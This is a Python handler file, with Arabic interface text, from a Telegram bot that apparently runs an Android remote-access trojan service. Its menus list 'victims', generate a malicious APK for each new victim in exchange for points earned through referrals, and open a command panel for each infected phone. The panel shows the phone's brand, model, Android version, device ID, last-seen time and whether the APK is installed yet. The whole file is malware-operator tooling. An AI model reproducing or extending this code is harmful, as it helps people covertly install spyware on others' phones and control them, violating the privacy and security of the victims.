# bot_handlers/callbacks/victims.py
# ============================================================
# إدارة الضحايا — v2 مع تأكيد الأدوات
# ============================================================

import time

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

from config import bot
from imports_manager import (
    can_use_tool, consume_usage,
    get_all_victims, get_victim, delete_victim,
    build_main_payment_keyboard,
    POINTS_SYSTEM_ENABLED,
)
from logging_config import get_logger

from ..helpers import safe_edit, h
from ..keyboards import victim_commands_panel, main_menu

logger = get_logger("bot_handlers.callbacks.victims")


def handle(call, chat_id, user_id, data):

    # ═══════════════════════════════════════════════════
    # 📋 قائمة الضحايا
    # ═══════════════════════════════════════════════════
    if data == "v_list":
        bot.answer_callback_query(call.id)
        victims = get_all_victims(chat_id)
        m = InlineKeyboardMarkup()
        m.add(InlineKeyboardButton("➕ ضحية جديدة (APK)", callback_data="v_new"))
        m.add(InlineKeyboardButton("🌐 فتح لوحة التحكم (ويب)", callback_data="open_dashboard"))
        if victims:
            m.add(InlineKeyboardButton(
                f"━━━ 📋 ضحاياي ({len(victims)}) ━━━",
                callback_data="noop"
            ))
            for v in victims[:15]:
                vid = v.get("victim_id", "")
                name = v.get("name", "?")[:18]
                status = v.get("status", "pending")
                icon = "🟢" if status == "active" else "⏸️"
                m.add(InlineKeyboardButton(f"{icon} {name}", callback_data=f"v_open_{vid}"))
        m.add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main"))

        text = (
            f"👥 <b>إدارة الضحايا</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📊 <b>العدد:</b> <code>{len(victims)}</code>\n\n"
        )
        if not victims:
            text += "📭 <b>لا يوجد ضحايا بعد</b>\n\n💡 اضغط <b>➕ ضحية جديدة</b>"
        else:
            text += "👇 اختر ضحية للتحكم بها"

        safe_edit(call, text, reply_markup=m)
        return

    # ═══════════════════════════════════════════════════
    # ➕ ضحية جديدة → عرض رسالة تأكيد
    # ═══════════════════════════════════════════════════
    if data == "v_new":
        bot.answer_callback_query(call.id)

        # ★ عرض رسالة تأكيد الخصم
        try:
            from points_system import (
                build_tool_confirm_text,
                build_tool_confirm_keyboard,
            )
            text, can_proceed = build_tool_confirm_text(user_id, "apk")
            m = build_tool_confirm_keyboard("apk", can_proceed)
            safe_edit(call, text, reply_markup=m)
            return
        except Exception as e:
            logger.exception(f"tool_confirm apk error: {e}")
            # Fallback: نفذ مباشرة
            _start_apk_flow(call, chat_id, user_id)
            return

    # ═══════════════════════════════════════════════════
    # 🔓 فتح ضحية موجودة
    # ═══════════════════════════════════════════════════
    if data.startswith("v_open_"):
        victim_id = data.replace("v_open_", "")
        victim = get_victim(chat_id, victim_id)
        if not victim:
            bot.answer_callback_query(call.id, "❌ غير موجودة", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        safe_edit(call, _build_victim_text(victim),
                  reply_markup=victim_commands_panel(victim_id))
        return

    # ═══════════════════════════════════════════════════
    # 🔄 تحديث
    # ═══════════════════════════════════════════════════
    if data.startswith("v_refresh_"):
        victim_id = data.replace("v_refresh_", "")
        victim = get_victim(chat_id, victim_id)
        if victim:
            bot.answer_callback_query(call.id, "🔄 تم التحديث")
            safe_edit(call, _build_victim_text(victim),
                      reply_markup=victim_commands_panel(victim_id))
        return

    # ═══════════════════════════════════════════════════
    # ✏️ إعادة تسمية
    # ═══════════════════════════════════════════════════
    if data.startswith("v_rename_"):
        victim_id = data.replace("v_rename_", "")
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "✏️ <b>أرسل الاسم الجديد:</b>", parse_mode="HTML")
        from ..steps.victim_steps import v_rename_step
        bot.register_next_step_handler(msg, lambda m: v_rename_step(m, victim_id))
        return

    # ═══════════════════════════════════════════════════
    # 🗑️ حذف
    # ═══════════════════════════════════════════════════
    if data.startswith("v_delete_"):
        victim_id = data.replace("v_delete_", "")
        victim = get_victim(chat_id, victim_id)
        if not victim:
            bot.answer_callback_query(call.id, "❌", show_alert=True)
            return
        m = InlineKeyboardMarkup()
        m.row(
            InlineKeyboardButton("✅ نعم", callback_data=f"v_confirm_del_{victim_id}"),
            InlineKeyboardButton("❌ إلغاء", callback_data=f"v_open_{victim_id}"),
        )
        bot.answer_callback_query(call.id)
        safe_edit(call, f"⚠️ <b>حذف ضحية {h(victim.get('name'))}?</b>", reply_markup=m)
        return

    if data.startswith("v_confirm_del_"):
        victim_id = data.replace("v_confirm_del_", "")
        delete_victim(chat_id, victim_id)
        bot.answer_callback_query(call.id, "🗑️ تم الحذف")
        safe_edit(call, "✅ <b>تم الحذف</b>", reply_markup=main_menu(user_id))
        return


# ══════════════════════════════════════════════════════
# بدء APK Flow (بعد التأكيد)
# ══════════════════════════════════════════════════════
def _start_apk_flow(call, chat_id, user_id):
    """يبدأ عملية إنشاء APK — بيتنادى بعد التأكيد"""
    bot.answer_callback_query(call.id, "✅ جاري البدء...")

    # ─── تحقق من الصلاحية واخصم ───
    check = can_use_tool(user_id, "apk")
    if not check["allowed"]:
        if check["reason"] == "insufficient_points":
            needed = check.get("needed", 0)
            cost = check.get("cost", 0)
            balance = check.get("balance", 0)

            m = InlineKeyboardMarkup()
            m.add(InlineKeyboardButton("💰 نقاطي", callback_data="points_menu"))
            m.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))

            safe_edit(
                call,
                f"❌ <b>رصيدك غير كافي!</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n\n"
                f"💰 <b>المطلوب:</b> <code>{cost}</code> نقطة\n"
                f"💎 <b>رصيدك:</b> <code>{balance}</code> نقطة\n"
                f"⚠️ <b>ناقصك:</b> <code>{needed}</code> نقطة\n\n"
                f"💡 <i>شارك رابط الإحالة للحصول على نقاط</i>",
                reply_markup=m
            )
            return

        safe_edit(call, "❌ لا يمكن استخدام الأداة", reply_markup=main_menu(user_id))
        return

    # ─── اخصم ───
    consume_usage(user_id, "apk")

    # ─── ابدأ الـ flow ───
    msg = bot.send_message(
        chat_id,
        "📝 <b>إضافة ضحية جديدة</b>\n\n"
        "أرسل اسم الضحية (مثلاً: <code>أحمد</code>)",
        parse_mode="HTML"
    )
    from ..steps.victim_steps import victim_name_step
    bot.register_next_step_handler(msg, victim_name_step)


# ══════════════════════════════════════════════════════
# Helpers
# ══════════════════════════════════════════════════════
def _build_victim_text(victim):
    name = victim.get("name", "?")
    status = victim.get("status", "pending")
    device_id = victim.get("device_id", "—")
    model = victim.get("model", "—")
    android = victim.get("android", "—")
    brand = victim.get("brand", "—")
    last_seen = victim.get("last_seen")

    status_icon = "🟢 متصل" if status == "active" else "⏸️ في انتظار التثبيت"
    last_str = "—"
    if last_seen:
        try:
            diff = time.time() - float(last_seen)
            if diff < 60:
                last_str = f"قبل {int(diff)} ثانية"
            elif diff < 3600:
                last_str = f"قبل {int(diff/60)} دقيقة"
            elif diff < 86400:
                last_str = f"قبل {int(diff/3600)} ساعة"
            else:
                last_str = f"قبل {int(diff/86400)} يوم"
        except Exception:
            pass

    return (
        f"👤 <b>{h(name)}</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📊 الحالة: {status_icon}\n"
        f"📱 الجهاز: <code>{h(brand)} {h(model)}</code>\n"
        f"🤖 Android: <code>{h(android)}</code>\n"
        f"🆔 Device: <code>{h(device_id[:16]) if device_id else '—'}</code>\n"
        f"🕐 آخر ظهور: {last_str}\n\n"
        f"🎛️ <b>اختر الأمر:</b>"
    )
